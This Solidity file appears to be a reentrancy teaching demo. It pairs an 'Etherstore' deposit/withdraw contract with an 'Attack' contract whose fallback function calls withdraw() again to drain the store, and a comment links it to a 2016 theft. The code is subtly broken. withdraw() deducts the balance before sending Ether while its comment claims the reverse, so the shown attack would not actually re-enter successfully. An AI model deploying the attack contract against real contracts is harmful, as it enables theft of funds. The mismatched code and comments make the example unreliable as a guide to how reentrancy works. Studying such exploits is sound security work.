// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Etherstore {
    mapping(address => uint) public balances;
    // the attack function happened in 2016 where millions of dollars was stolen

    function deposit() public payable {
        balances[msg.sender] += msg.value;
    }
    //Allows users to deposit Ether into the contract.
    //The payable keyword indicates that the function can receive Ether.
    //The amount of Ether sent with the transaction is added to the balance of the sender
    // (msg.sender).
       function withdraw(uint _amount) public {
        require(balances[msg.sender] >= _amount);
        
         balances[msg.sender] -= _amount;
        (bool sent, )= msg.sender.call{value: _amount}(" ");
        require(sent, "failed to send Ether");

    }
    //Allows users to withdraw a specified amount of Ether.
     //Requires that the user has a balance greater than or equal to the specified withdrawal 
     //amount.
     //Uses the call function to send Ether to the caller. The empty string (" ") is passed 
     //as data to the call.
     //If the Ether transfer is successful, the balance of the sender is reduced by the 
     // specified amount
     

    function getBalance() public view returns (uint) {
        return address(this).balance;
        //Returns the current balance of the contract.
    
    }
    
}
contract Attack {
    Etherstore public etherStore;

    constructor(address _etherStoreAddress) {
        etherStore = Etherstore(_etherStoreAddress);
    }
    receive() external payable { }

    fallback() external payable { 
        if (address(etherStore).balance >= 1 ether){ 
            etherStore.withdraw(1 ether);
        }
    }

    function attack() external payable {
        require (msg.value >= 1 ether);
        etherStore.deposit{value: 1 ether}();
        etherStore.withdraw(1 ether);
    }

    function getBalance() public view returns (uint) {
        return address(this).balance;
    }
}